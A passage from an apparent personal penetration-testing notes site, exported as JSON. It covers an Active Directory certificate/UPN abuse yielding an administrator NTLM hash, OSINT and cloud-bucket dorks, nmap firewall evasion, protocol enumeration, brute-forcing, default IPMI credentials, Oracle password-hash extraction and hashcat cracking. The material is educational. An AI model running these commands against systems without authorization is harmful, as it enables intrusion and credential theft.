the ntlm hash.\nExample of ESC8# 1. Changing the userPrincipal of olivia to administrator\ncertipy-ad account update -u &#039;fredrik&#039; -p &#039;password&#039; -t &#039;int.cosmos.com&#039; -user &#039;olivia&#039; -upn &#039;administrator&#039;\n \n# 2. Requesting certificate as olivia\ncertipy-ad req -ca &#039;cosmos-DC01-CA&#039; -template &#039;CertifiedAuthentication&#039; -u &#039;olivia@int.cosmos.com&#039; -hashes &#039;NTLM HASH&#039;\n \n# 3. Changing the userPrincipal of olivia to it&#039;s original value\ncertipy-ad account update -u &#039;fredrik&#039; -p &#039;password&#039; -t &#039;int.cosmos.com&#039; -user &#039;olivia&#039; -upn &#039;olivia&#039;\n \n# 4. Authenticating as administrator to obtain ntlm hash\ncertipy-ad req -u &#039;administrator&#039; -pfx &#039;administrator.pfx&#039; -d &#039;int.cosmos.com&#039;\nAll these commands will help us with obtaining the ntlm hash of the administrator. How can we protect our environment from such attack? We can prevent it by enabling HTTPS on the server and disabling ntlm authentication using Group Policy Object.\nReferences\n\nNightFox, 2024, Exploiting and Detecting Shadow Credentials and msDS-KeyCredentialLink in Active Directory, (Accessed on 31 December 2024)\nTheHacker, 2024, Shadow Credentials, (Accessed on 31 December 2024)\nWill Schroeder, 2021, Certified Pre-Owned, (Accessed on 31 December 2024)\n"},"Documents/index":{"slug":"Documents/index","filePath":"Documents/index.md","title":"Documents","links":[],"tags":[],"content":""},"Penetration-Testing/0000-Introduction":{"slug":"Penetration-Testing/0000-Introduction","filePath":"Penetration Testing/0000 Introduction.md","title":"Introduction to Penetration Testing","links":["Penetration-Testing/0000-Introduction"],"tags":["Penetration-Testing"],"content":"What is Penetration Testing?\nPenetration Testing (Pentest) is a organized and authorized attack which the purpose is about finding security vulnerabilities in an organization and use these security vulnerabilities to gain access to the organization’s systems and then further elevate our privileges by compromising more systems.\nThe main goal of penetration testing is to find these vulnerabilities and have them patched before it affects the organization in a negative way. It’s also possible the organization may choose to accept the risk of a system vulnerability in Risk Management.\nPenetration Testing Framework\n\nPenetration Testing Framework is a fantastic framework which goes through the different processes that are included in a penetration test. Here’s a quick summary of the different stages:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nStagesDescriptionInformation GatheringThis stage is about searching for information such as the systems, operating systems, and software’s the organization uses.Vulnerability AssessmentThis stage is about researching the vulnerabilities these systems, operating systems, and software’s can be vulnerable to.Exploitation &amp; Post ExploitationThis stage is about reading through the exploit code and modifying it to our needs to exploit the service running on the system.Lateral MovementThis stage is about elevating our access by compromising higher privileged accounts which allows us to access systems that contains confidential informations.\nPenetration Testers mostly spends their time in the information gathering and vulnerability assessment stages as these are key stages that allows us to compromise a environment and systems in that environment. And sites such as CVEDetails, Packetstorm, ExploitDB, Vulners, and NIST are great in these stages.\nRisk Management\nRisk Management is about analyzing the different security issues and risks to ensure the organization is protected. In some instances the organization may choose to accept certain risks as the system or software is business critical and in those instances, it’s highly recommended to have insurance on those systems and software’s incase it’s compromised in the future.\nRisk Management also plays a critical role in a penetration test since the system could be vulnerable for multiple of vulnerabilities and executing these vulnerabilities against the system could potentially crash the system and affect the business negatively. An example is if the system is vulnerable for remote code execution and SQL injection, it’s always recommended to use SQL injection to minimize the risks of crashing the system.\nOpen Web Application Security Project (OWASP)\nOpen Web Application Security Project (OWASP) has a list over the top 10 most dangerous vulnerabilities for web applications. It’s a fantastic resource for understanding the different vulnerabilities for web applications and it also includes prevention methods for us to protect our web applications.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nNumberCategoryDescription1Broken Access ControlRestriction from viewing sensitive information’s about users email, data, and etc…2Cryptographic FailureFailing to encrypt data at rest and transfer can put the data in dangerous people’s hands.3InjectionValidating users input is important as users could try to exfiltrate data from the web application or services.4Insecure DesignThese issues occurs when application is not designed with security in mind.5Security MisconfigurationMisconfiguring services, cloud services, error logs, and configuration files cloud lead to disclosing too much information’s.6Vulnerable and Outdated ComponentsUsing components which are outdated both client-side and server-side.7Identification and Authentication FailuresImplementing protection such as lockout, cooldown, and secure coding practices in authentication aspect of our application can prevent attackers from compromising our users.8Software and Data Integrity FailuresWhen an web application relies on plugins, libraries, and modules it’s important to ensure it comes from a trusted sources, repositories, content delivery networks.9Security Logging and Monitoring FailuresSecurity logs and monitoring failures can help us detect malicious activities and prevent them from escalating further.10Server-Side ForgeryServer-Side Forgery (SSRF) allows a threat actor to fetch internal websites and sources if the user input isn’t validated.\nIt’s important to note that the OWASP Top 10 could be different in the near future as new vulnerabilities and attack factors are discovered by security researchers. I highly recommend memorizing the OWASP Top 10 as it’s a great thing to talk about during a interview as it can help you stand out from others."},"Penetration-Testing/0001-Information-Gathering":{"slug":"Penetration-Testing/0001-Information-Gathering","filePath":"Penetration Testing/0001 Information Gathering.md","title":"Information Gathering","links":[],"tags":["Penetration-Testing"],"content":"OSINT\nOSINT (Open Source Intelligence) is about gathering information about our target using public resources available for us in the internet. It’s a-lot of information’s that is possible to obtain through internet because employees are simply not aware of best security practices.\nEmployees\nSimplest and easiest way to obtain information’s about a organization is by inspecting job requirements and employees social media accounts as these will contain information’s about laptops, technologies, and operating system the organization uses. Here are some real scenarios where employees might be sharing confidential information’s without being aware of it.\nWhat laptops, computers, and operating systems does the organization use? This information is critical for threat actors as that allows them to prepare their payloads for the specific laptop, computer, and operating system. An employee can easily and quickly leak these information’s by posting a picture of their workspace on social media or by posting a comment about a issue which they are experiencing with their laptops.\nWhat are the user principal name of employees in a organization? This information is also critical for threat actors as it allows them to do password brute-force attack on users after accessing our network. This information is easily collectable through LinkedIn as most companies uses the first character of first name and the full last name as their user principal name. An example of that is Joe Doe user principal is JDoe.\nWhat technologies does the organization use? This information is also critical for threat actors as allows them to research our technologies to potentially find a weakness. This information can easily be obtained through LinkedIn job specifications or by an employee asking for advice in StackOverflow.\nA employee could also be getting bribed or blackmailed by the threat actor to leak these information’s. A important thing to note is a threat actor can be a employee, competitor, or malicious threat actor that wants to compromise your organization for financial gain.\nDomain Name\nDomain Name contains a-lot of valuable information’s such as owner of domain, subdomains, and text records which can be used to obtain the technologies the organization uses. Here are some tools which can assist us with obtaining all these information’s.\nCRT.SH is a tool that allows us to obtain information’s about the subdomains and the IP-addresses that belongs to the subdomain. It’s possible for us to use the CURL with the CRT.SH web application to obtain these information’s.\nCurling CRT.SH# Curling information about a website\ncurl -s &#039;crt.sh/#039; | jq . | grep name | cut -d &#039;:&#039; -f 2 | grep -v &#039;CN=&#039; | cut -d &#039;&quot;&#039; -f 2 | awk &#039;{gsub(/\\\\n/,&quot;\\n&quot;);}1;&#039; | sort -u &gt; subdomainlist\n \n# Getting the IP-addresses for these hosts\nfor i in $(cat subdomainlist);do host $i | grep &#039;has address&#039; | grep &#039;husenjan.com&#039; | cut -d&quot; &quot; -f1,4 | sort -u; done\nCensys is a great alternative to CRT.SH it also allows us to obtain informations about the subdomains and IP-addresses that belongs to the subdomain.\nDomain Namecurl search.censys.io/search\nShodan.io is the perfect tool to use after obtaining the IP-addresses of our targets as it allows us to see which ports are open on our targets and potential links between the IP-address and another IP-address.\nObaiting Information with Shodan# Capturing only IP-addresses \nfor i in $(cat subdomainlist); do host $i | grep &#039;has address&#039; | grep &#039;husenjan.com&#039; | cut -d &#039; &#039; -f 4 | sort -u; done &gt; iplist\n \n# Using Shodan on these IP-addresses\nfor i in $(cat iplist); do shodan host $i; done\nDig is a good command to be familiar with as it allows us to fetch domain name records such as IP-addresses and text records.\nObtaining Information with Digdig any &#039;husenjan.com&#039;\nThe text records can contain information’s about the technologies the organization uses such as Outlook, Gmail, LogMeIn and so forth. Which are valuable information as it allows us to create phishing email which bypasses these technologies.\nCloud Storage\nCloud Storages are widely used in all organization’s in some kind of form and these cloud storages can easily be misconfigured by a employee and that will allow the threat actor to access it without any authentication. It’s fairly easy to find these cloud storages using Google Search engine.\nAmazon S3 Bucket &amp; Azure Blobs &amp; Google Cloud Storage# Amazon S3 Bucket\nintext:&#039;&lt;COMPANY-NAME&gt;&#039; inurl:&#039;amazonaws.com&#039;\n \n# Azure Blobs\nintext:&#039;&lt;COMPANY-NAME&gt;&#039; inurl:&#039;blob.core.windows.net&#039;\n \n# Google Cloud Storage\nintext:&#039;&lt;COMPANY-NAME&gt;&#039; inurl:&#039;storage.googleapis.com&#039;\nInside cloud storage there can be confidential documents, ssh keys, and passwords which are extremely valuable. It’s impossible for a organization to track all these activities because the traffic could be from a visitor or employee. If you’re interested in learning more about OSINT, I highly recommend checking out the OSINT Framework.\nNmap\nNetwork Mapper (Nmap) is a critical tool for penetration testing as it allows us to obtain information’s about our targets. It comes with capabilities such as Host Discovery, Port scanning, and Operating System Detection and so forth…\nIt’s always recommended to do manual enumeration after obtaining information’s from Nmap as there might be security misconfiguration or vulnerabilities which were not detected by Nmap. It’s also a good practice to always do manual enumeration as that will allow us to understand the service and the purpose of it which could save us anywhere from hours to days.\nWhat is Host Discovery? It’s a technique in Nmap that enables us to search through a IP-address range or an list to find active hosts. This is great for situations were we need to search for active hosts in an environment to find potential targets.\nHost Discovery# Nmap: Scans through range of IP-addresses\nnmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d&quot; &quot; -f5\n \n# Nmap: Scans through a list of IP-addresses\nnmap -sn -oA tnet -iL &#039;&lt;HOST-LIST&gt;&#039; | grep for | cut -d &quot; &quot; -f5\n \n# Nmap: Scans through multiple of IP-addresses\nnmap -sn -oA tnet 10.129.2.0-20 | grep for | cut -d &quot; &quot; -f5\nWhat is Port Scanning? It’s a technique in Nmap that enables us to search for open TCP and UDP ports on our targets and obtain information’s about the services running on these ports. The main difference between TCP and UDP ports is the TCP port uses three way handshake and ensures that all packet sent from client and server is received while UDP keeps sending packets while delivery of packets fails.\nPort Scanning# Nmap: Scanning for TCP ports\nnmap -sV -sC -sT -p- --min-rate=10000 &#039;&lt;RHOST&gt;&#039; --disable-arp-ping --packet-trace\n \n# Nmap: Scanning for TCP ports Half Handshake\nnmap -sV -sC -sS -p- --min-rate=10000 &#039;&lt;RHOST&gt;&#039; --disable-arp-ping --packet-trace \n \n# Nmap: Scanning for UDP ports\nnmap -sV -sC -sU -p- --min-rate=10000 &#039;&lt;RHOST&gt;&#039; --disable-arp-ping --packet-trace\nWhen Nmap is completed with scanning our targets the ports can be in different states such as open, closed, filtered, and unfiltered because the firewall, intrusion detection system, or intrusion prevention system disallowed our packets from accessing or communicating with these ports. It’s possible to bypass these protection by using the following commands.\nBypassing Firewalls &amp; IDS &amp; IPS# Nmap 1.0: For testing Firewall/IDS/IPS...\nnmap &#039;&lt;RHOST&gt;&#039; -n -Pn --disable-arp-ping -p 80\n \n# Nmap 1.1: Bypassing security protection by using decoy IP-addresses\nnmap &#039;&lt;RHOST&gt;&#039; -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 \n \n# Nmap 1.2 : Bypassing security protection by using spoofed IP-address\nnmap &#039;&lt;RHOST&gt;&#039; -n -Pn -p 80 -O -S &#039;&lt;SPOOFED-IP&gt;&#039; -e tun0\n \n# Nmap 1.3: Bypassing security protection by using DNS Proxying\nnmap &#039;&lt;RHOST&gt;&#039; -n -Pn -sS -p 445  --disable-arp-pint --packet-trace --source-port 53 \nInteracting with Port using DNS Proxyncat -nv --source-port 53 &#039;&lt;RHOST&gt;&#039; &#039;&lt;RPORT&gt;&#039;\nIf our port connection comes back as Filtered it means that our packets were blocked by the firewall, intrusion detection system, or intrusion prevention system. We can try the different commands to bypass the security mechanisms and after successfully bypassing it we can use ncat to manually enumerate the service.\nProtocols\nUnderstanding the functionality of different protocols such as SSH, FTP, SMB, NFS, DNS, SMTP, IMAP &amp; POP3, SNMP, MySQL, MMSQL, Oracle TNS, and IPMI is important because these are services that will be found in a-lot organization’s and sometimes these services can be misconfigured which allows us to obtain information’s about the organization’s infrastructure.\nSSH\nSecure Shell (SSH) is a network protocol that enables us to securely and remotely communicate with our servers and machines through a encrypted tunnel. It’s possible to configure SSH to accept passwords or a RSA key. Here’s a overview of logging into a server using SSH.\nSSH# Logging in using password\nssh &lt;USERNAME&gt;@&lt;IP&gt;\n \n# Logging in using RSA key\nssh -i id_rsa &lt;USERNAME&gt;@&lt;IP&gt;\nThe preferred authentication method in 2025 is RSA key as password is something which can be guessed by a threat actor. However, passwords are still widely used for SSH nowadays.\nFTP\nFile Transfer Protocol (FTP) is one of the oldest protocols that runs at the application layer. The FTP protocol was first establishes a connection on TCP Port 21 which is used for sending commands and returning error codes. The FTP service then establishes another connection at TCP Port 20 which is used for transferring from user to server and server to user. Here are overview of some commands that can come in good use while working with FTP service.\nFTP# Conencting as anonymous \nftp anonymous@10.129.15.20\n \n# FTP: Download file\nget &#039;&lt;FILE&gt;&#039;\n \n# FTP: Upload file\nput &#039;&lt;FILE&gt;&#039;\n \n# FTP: Downloading all files\nwget -m --no-passive &#039;ftp://&lt;USERNAME&gt;@&lt;IP&gt;&#039;\nIn some instances the FTP service can be misconfigured to allow anonymous logins which allows everyone to access the FTP service without authenticating and in these situations the FTP service is a goldmine as threat actors can download confidential files and replace executables with their malicious executable.\nSMB\nServer Message Block (SMB) is a client-server protocol that regulates access to files, directories, and other networks such as printer, routers, and interfaces released for the network. An alternative for SMB is Samba which is developed for Unix-based operating systems and it allows Linux systems to communicate with Windows severs. In modern infrastructure the SMB and Samba uses the TCP Port 445 while in legacy infrastructure the UDP Port 137, 138, and 139 are commonly used. Here are some commands which I recommend familiarizing yourself with as SMB service is common in almost all environment’s nowadays.\nSMB# Listing all directories inside SMB client\nsmbclient -L &#039;\\\\\\\\&lt;RHOST&gt;\\\\&#039;\n \n# SMB: Download a file\nget &#039;&lt;FILE&gt;&#039;\n \n# SMB: Upload a file\nput &#039;&lt;FILE&gt;&#039;\nIn some environments the SMB service allows the guest user to access shares and this can lead to unauthorized access to confidential files and replace files with their malicious executables.\nSMB# Logging in as guest to SMB service\nsmbclient -U &#039;guest&#039; \\\\\\\\&lt;IP&gt;\\\\&lt;SHARE&gt;\n \n# Logging in as guest to SMB service\ncrackmapexec smb &#039;&lt;IP&gt;&#039; --shares -u &#039;guest&#039; -p &#039;&#039;\nAfter successfully accessing the SMB service it’s possible to obtain information’s about the Windows server using Enum4Linux and RPCClient but that requires us to manually enumerate the SMB service.\nSMBenum4linux &#039;&lt;RHOST&gt;&#039; -A\nRPCClient# Logging in as anonymous user with RPCClient\nrpcclient -U &quot;&quot; &#039;&lt;RHOST&gt;&#039;\n \n# RPCClient: Getting server information&#039;s\nsrvinfo\n \n# RPCClient: Getting domain information&#039;s\nenundomains\n \n# RPCClient: Getting more domain information&#039;s\nquerydominfo\n \n# RPCClient: Getting file share information&#039;s\nnetshareenumall\n \n# PRCClient: Getting information about a directory\nnetsharegetinfo &#039;&lt;DIRECTORY&gt;&#039;\n \n# RPCClient: Getting all users from SMB service\nenumdomusers\n \n# RPCClient: Getting user information&#039;s from SMB service\nqueryuser &#039;&lt;HEX-ID&gt;&#039;\nOne thing that should be “must do” is running enum4linux against the SMB service at all penetration tests as it can help us obtain a-lot of information’s about the Windows server. I highly recommend setting up a SMB service and try to understand the service as well as possible as it’s almost used in all environments.\nNFS\nNetwork File System (NFS) is a protocol developed for the same purpose as SMB. NFS is mostly optimized for Linux and Unix operating systems and it comes with different version such as NFS v2, NFSv3, and NFS v4 and each of them comes with different capabilities.\nThe NFS v2 is supported by many systems and operates over the UDP protocol. The NFS v3 comes with capabilities to handle larger files, better synchronization, and better error reporting. The NFS v4 includes Kerberos, ACL support, performance improvements, and higher security. It’s extremely simple to setup NFS share in our Linux environment.\nNFS# Replace &#039;10.129.10.0&#039; with your IP subnet\necho &#039;/mnt/nfs  10.129.10.0/24(sync,no_subtree_check)&#039; &gt;&gt; /etc/exports\n \n# Restart the NFS service\nsudo systemctl restart nfs-kernel-server\nOnce the NFS server is up and running it’s possible to use the following commands to mount and un-mount the NFS share from our client devices.\nNFS# Lists all mounts for NFS\nshowmount -e &#039;&lt;IP&gt;&#039;\n \n# Mounts the NFS to a directory\nsudo mount -t nfs &#039;&lt;IP&gt;:/&#039; &#039;&lt;LOCAL-FOLDER&gt;&#039; -o nolock\n \n# List all files to mounted directory\nls -lna &#039;LOCATION&#039;\n \n# Unmounts the NFS share\nsudo umount &#039;&lt;LOCAL-FOLDER&gt;&#039;\nWhen NFS has no_root_squash inside /etc/exports it will allow threat actors to elevate their privileges using SUID which is uploading the file as root and executing it on the server as a normal user.\nDNS\nDomain Name System (DNS) is a protocol for resolving domain names to IP addresses as that allows organizations to setup domains such as marketing.int.husenjan.com and direct the user to internal website. It’s possible for a threat actor to find these IP addresses by enumerating the DNS with Dig and dnsenum.\nDNS# Dig: Nameserver Information\ndig ns &#039;&lt;HOSTNAME&gt;&#039; &#039;@&lt;IP&gt;&#039;\n \n# Dig: Version Query\ndig ch txt version.bind &#039;&lt;IP&gt;&#039;\n \n# Dig: Query all\ndig any &#039;&lt;HOSTNAME&gt;&#039; &#039;@&lt;IP&gt;&#039;\n \n# Dig: Query Zone\ndig axfr &#039;&lt;HOSTNAME&gt;&#039; &#039;@&lt;IP&gt;&#039;\n \n# Aggressively scanning for subdomains with dnsenum\ndnsenum --dnsserver &#039;&lt;DNS-SERVER&gt;&#039; --enum -p 0 \n/opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt &#039;&lt;HOSTNAME&gt;&#039;\nIt’s always recommended to enumerate DNS service as in some instances it’s possible to find out different web application’s and services the organization uses by viewing the TXT records.\nSMTP\nSimple Mail Transfer Protocol (SMTP) is a protocol used for sending emails. It’s usually combined with IMAP and POP3 protocols as it allows the user to organize and view their emails. The SMTP service always runs on either TCP Port 25 or TCP Port 587 (Over SSL/TLS). If you’re interested in setting up SMTP service it’s recommended to use ESMTP as it’s more secure and reliable. Here are some commands which are useful to be familiar with to work with SMTP service.\nSMTP# Telnet: Connecting to SMTP service\ntelent &#039;&lt;IP&gt;&#039; 25\n \n# SMTP: Communicating\nHELO &#039;&lt;HOSTNAME&gt;&#039;\nEHLO &#039;&lt;HOSTNAME&gt;&#039;\n \n# SMTP: Finding users\nVRFY &#039;&lt;USERNAME&gt;&#039;\n \n# SMTP: Automatically enumerate users\nsmtp-user-enum -M VRFY -U &#039;&lt;USERNAMELIST&gt;&#039; -t &#039;&lt;TARGET&gt;&#039;\n \n# SMTP: Sending email\n \nMAIL FROM: &lt;mrb3n@inlanefreight.htb&gt;\nRCPT TO: &lt;mrb3n@inlanefreight.htb&gt;\n \nDATA\n \nFrom: &lt;cry0l1t3@inlanefreight.htb&gt;\nTo: &lt;mrb3n@inlanefreight.htb&gt;\nSubject: DB\nDate: Tue, 28 Sept 2021 16:32:51 +0200\nHey man, I am trying to access our XY-DB but the creds don&#039;t work. \nDid you make any changes there?\n.\nVRFY command may seem completely useless but finding these usernames can be a goldmine as it allows us to launch our brute-force attack against valid usernames. You don’t necessary need to remember these commands but it’s useful to know these incase SMTP service is running on a target.\nIMAP/POP3\nInternet Message Access Protocol (IMAP) is a protocol that is assigned the TCP Port 143 and 993 and comes with capabilities for us to access emails, manage emails, and folder structure support. Post Office Protocol Version 3 (POP3) is a protocol that is assigned the TCP Port 110 and 995 and comes with same capabilities as IMAP besides folder structure support. While enumerating IMAP and POP3 services it’s always worth connecting to them TCP and TCP over HTTPS.\nIMAP/POP3# Nmap: Scannign IMAP and POP3\nnmap -sV -sC -p 110,143,993,995 &#039;&lt;IP&gt;&#039; -o nmap.result\n \n# Netcat: Connecting to IMAP and POP3 using TCP\nncat -nv &#039;&lt;RHOST&gt;&#039; &#039;&lt;RPORT&gt;&#039;\n \n# OpenSSL: COnencting to IMAPs using TCP over HTTPS\nopenssl s_client -connect &#039;&lt;IP&gt;:imaps&#039;\n \n# OpenSSL: Connecting to POP3s using TCP over HTTPS\nopenssl s_client -connect &#039;&lt;IP&gt;:pop3s&#039;\nOnce a connection has been established between our client and the IMAP or POP3 service it’s possible to communicate with the IMAP and POP3 service using the following commands.\nIMAP Commands\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCommandDescription1 LOGIN USERNAME PASSWORDLogging into the IMAP service.1 LIST &#039;&#039; *Listing all mailboxes.1 CREATE &#039;INBOX&#039;Creates a mailbox.1 DELETE &#039;INBOX&#039;Deleting a mailbox.1 RENAME &#039;INBOX&#039; &#039;Important&#039;Renames a mailbox.1 LSUB &#039;&#039; *Returns a list of emails the mailbox is subscribed to.1 SELECT &#039;INBOX&#039;Selects a mailbox so emails can be accessed.1 UNSELECT &#039;INBOX&#039;Exits the selected mailbox.1 FETCH 1 ALLRetrieves data associated with a email.1 FETCH 1 body[text]Retrieving body associated with a email.1 LOGOUTCloses the IMAP server.\nPOP3 Commands:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCommandDescriptionUSER usernameIdentifies the user.PASS passwordAuthentication of the user using its password.STATRequests the number of saved emails from the server.LISTRequests from the server the number and size of all emails.RETR idRequests the server to deliver the requested email by ID.DELE idRequests the server to delete the requested email by ID.CAPARequests the server to display the server capabilities.RSETRequests the server to reset the transmitted information.QUITCloses the connection with the POP3 server.\nIt’s not necessary to remember all these commands for IMAP and POP3 services but I highly recommend noting them down so it’s accessible in the future because it’ extremely useful to have them. If you’re interested in learning more about IMAP commands I recommend checking out IMAP Commands by DonustherLand.\nSNMP\nSimple Network Management Protocol is a protocol is used for monitoring and managing network devices such as routers, switches, and IOT devices. The SNMP protocol is assigned UDP Port 161 and it uses the UDP Port 162 t communicate with network devices incase of an event. SNMP also uses Management Information Base (MIB) to support different devices across different manufacturers.\nThe SNMPv3 is a secure protocol as it comes with authentication and encryption under transmission. However, SNMPv1 and SNMPv2 doesn’t come with these security capabilities and that allows threat actors to access community strings such as public and private. However, the SNMPv3 service can be misconfigured without any authentication which allows us to access strings inside SNMPv3. Here are some commands to enumerate the SNMP protocol.\nSNMP# SNMPWalk: Obtaining information&#039;s about SNMPv1\nsnmpwalk -v 1 -c public &#039;&lt;RHOST&gt;&#039;\n \n# SNMPWalk: Obtaining information&#039;s about SNMPv2\nsnmpwalk -v 2c -c public &#039;&lt;RHOST&gt;&#039;\n \n# SNMPWalk: Obtaining information&#039;s about SNMPv2\nsnmpwalk -v3 -l noAuthNoPriv -c public -m ALL &#039;&lt;RHOST&gt;:&lt;RPORT&gt;&#039;\n \n# Onesixtyone: Brute-force attacking SNMP service for strings\nonesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt &#039;&lt;RHOST&gt;&#039;\nIn some instances the public and private strings doesn’t exists in SNMP protocol and in these instances it’s possible to use onesixtyone to launch a brute-force attack to find these strings.\nMySQL\nMySQL is a database system that enables us to store information’s about our users, website settings, posts, and articles and much more… It’s common for dynamic web applications to fetch and update these data while doing authentication and updating title of the web applications. All these actions are completed using the SQL language.\nMySQL# Login to MySQL database\nmysql -u &#039;&lt;USERNAME&gt;&#039; -p -h &#039;&lt;RHOST&gt;&#039;\n \n# View all databases\nshow databases;\n \n# Select a database\nuse &#039;&lt;DATABASE-NAME&gt;&#039;;\n \n# View all tables\nshow tables;\n \n# View records inside a table\nselect * from  &#039;&lt;TABLE&gt;&#039;;\n \n# View records inside a table with filter\nselect * from &#039;&lt;TABLE&gt;&#039; WHERE name = &#039;John Doe&#039;;\nMySQL database contains a-lot of valuable information’s about website, users, and customers and if these information’s are leaked it can significantly damage the reputation of the organization which can have a negative financial effect.\nMSSQL\nMicrosoft SQL (MMSQL) is a relational database system developed by Microsoft and it’s assigned the TCP Port 1433. MSSQL is popular because it’s compatible with the .NET programming language which is widely used for developing applications. In MSSQL all the actions are completed using the Transact-SQL language.\n# MSSQL (Local Account): Connecting to MSSQL using Linux\nmssqlclient &#039;&lt;USERNAME&gt;@&lt;IP&gt;&#039;\n \n# MSSQL (Domain Account): Connecting to MSSQL using Linux\nmssqlclient &#039;&lt;USERNAME&gt;@&lt;IP&gt;&#039; -windows-auth\n \n# List all databases\nselect name from sys.databases;\n \n# List all tables\nselect table_name from information_schema.tables;\nUnderstanding and learning about MSSQL will be important for us as it’s a database system which is widely used by organization’s. I personally recommend setting up MSSQL on a virtual machine and start playing around with it.\nOracle TNS\nOracle Transparent Network Substate (Oracle TNS) is a database system from Oracle which is assigned the TCP Port 1521 and it supports protocols such as IPX/PSX and TCP/IP because of that it’s preferred in industries such as healthcare, finance and retails. It also comes with security features such as encryption at rest and transit, comprehensive analysis tools, error reporting, logging, workload management, and fault tolerance.\nTo access a Oracle TNS it requires us to use a SID and valid credentials otherwise our connection will not be established with database. The SID is used by Oracle’s enterprise application to identify the database. It’s possible to brute-force attack the SID and credentials with the following commands.\nOracle TNS# Nmap: Brute-force attacking SID\nsudo nmap -p 1521 -sV --script oracle-sid-brute &#039;&lt;IP&gt;&#039;\n \n# Odat: Brute-force attacking Credentials\nodat.py all -s &#039;&lt;IP&gt;&#039;\n \n# SQLPlus: Logging in to Oracle TNS\nsqlplus &#039;&lt;USERNAME&gt;@&lt;IP&gt;/&lt;SID&gt;&#039;\n \n# SQLPlus: Logging into a different databse\nsqlplus &#039;&lt;USERNAME&gt;@&lt;IP&gt;/&lt;SID&gt;&#039; as sysdba\nAccessing the Oracle TNS database requires us to install SQLPlus client from Oracle into our client machine. It’s possible to install the SQLPlus client using the following commands.\nOracle TNS# Install SQLPlus\nsudo apt-get install  oracle-instantclient-sqlplus\n \n# Fix issue with SQLPLus\nsudo sh -c &quot;echo /usr/lib/oracle/12.2/client64/lib &gt; /etc/ld.so.conf.d/oracle-instantclient.conf&quot;;sudo ldconfig\nSQL language for Oracle TNS is similar to MSSQL database. However, it requires us to use different layout to access the different informations.\nOracel TNS-- Listing all tables\nselect table_name from all_tables;\n \n-- See all user privileges\nselect * from user_role_privs;\n \n-- Extact usernames and passwords\nselect name, password from sys.user$;\nOracle TNS is a popular application for enterprises as it’s compatible with Oracle’s enterprise applications. It’s worth digging deeper into the Oracle TNS if you’re interested learning more about it.\nIPMI\nIPMI (Intelligent Platform Management Interface) is a hardware-based management system that is assigned the UDP Port 623 and it’s used for managing and monitoring systems even when they are powered off. It allows IT administrators to monitor temperature, voltage, fan status, and power supplies and it can be setup with SNMP to send alerts and logs. In some instances the IPMI can be accessed through default credentials because IT administrator forgot to change it.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nProductUsernamePasswordDell iDRACrootcalvinHP iLOAdministratorRandomized 8 character consisting with numbers and strings.Supermicro IPMIADMINADMIN\nIf the HP iLO is using the default credentials it’s possible to use Hashcat to guess the password with the following command {bash}hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u. In some instances it’s possible for us to dump the IPIMI hash using the following commands.\nIPMI# Launch msfconsole\nmsfconsole\n \n# Use IPMI bruteforce script\nuse auxiliary/scanner/ipmi/ipmi_dumphashes\n \n# Setting Remote Port\nset RHOST &#039;&lt;IP&gt;&#039;\n \n# Executing brute-force attack\nrun\n \n# Using hashcat to crack password hash\nhashcat -m 7300 &#039;&lt;HASH&gt;&#039; /usr/share/wordlists/rockyou.txt\nIPMI protocol is extremely valuable for threat actors as once they have gotten access to IPMI it’s possible for them to access business critical systems as root and administrator user.\nRemote Management Protocols\nIn Linux the most common way of accessing a server remotely is SSH and R-Services. SSH is currently the standard protocol in modern systems but in older systems may still be using R-Services. The most common way for accessing Windows server remotely is through Remote Desktop Protocol (RDP), Windows Remote Management (WinRM), and Windows Management Instrumentations (WMI). Here’s a small overview of the different protocols:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nNamePortDescriptionRemote Desktop Protocol3389A solution that allows administrators to manage system over SSL/TLS.Windows Remote Management5985, 5986A solution that establishes connection between remote host using the Simple Object Access Protocol (SOAP) over SSL/TLS.Windows management InstrumentationAllows read and write access to all settings on a Windows systems such as PCs and servers and it’s usually accessed through PowerShell, VBScript, and Windows Instrumentation Console.\nHere is a overview of commands that allows us to access the Windows server remotely using Parrot OS, Kali Linux, and other Linux systems.\nRemote Management Protocol# SSH: Connecting to remote host\nssh &#039;&lt;USERNAME&gt;@&lt;IP&gt;&#039;\n \n# SSH: Connecting to remote host using SSH key\nssh -i id_rsa &#039;&lt;USERNAME&gt;@&lt;IP&gt;&#039;\n \n# Remote Desktop Protocol: Connecting to a remote host\nxfreerdp /u:&#039;&lt;USERNAME&gt;&#039; /p:&#039;&lt;PASSWORD&gt;&#039; /v:&#039;&lt;RHOST&gt;&#039;\n \n# Windows Remote Management: Connecting to remote host\nevil-winrm -i &#039;&lt;RHOST&gt;&#039; -u &#039;&lt;USERNAME&gt;&#039; -p &#039;&lt;PASSWORD&gt;&#039;\n \n# Windows Management Instrumentation: Connecting to remote host\nwmiexec.py &#039;&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;RHOST&gt;&#039; &#039;&lt;HOSTNAME&gt;&#039;\nIt’s a-lot of information’s to grasp but understanding the different way we can access Windows servers is important since in some instances we might have obtained valid credentials where the server is only accessible using evil-winrm.\nWeb Reconnaissance\nWeb Reconnaissance consists of obtaining informations about the web applications to potentially find security misconfiguration and vulnerabilities which can be used to extract confidential informations or to remotely access the server. Web reconnaissance consists of three different stages and these are the following:\n\nIdentifying asset: Finding subdomains, directories, IP addresses, and technology company uses for web application.\nDiscovering hidden informations: Finding 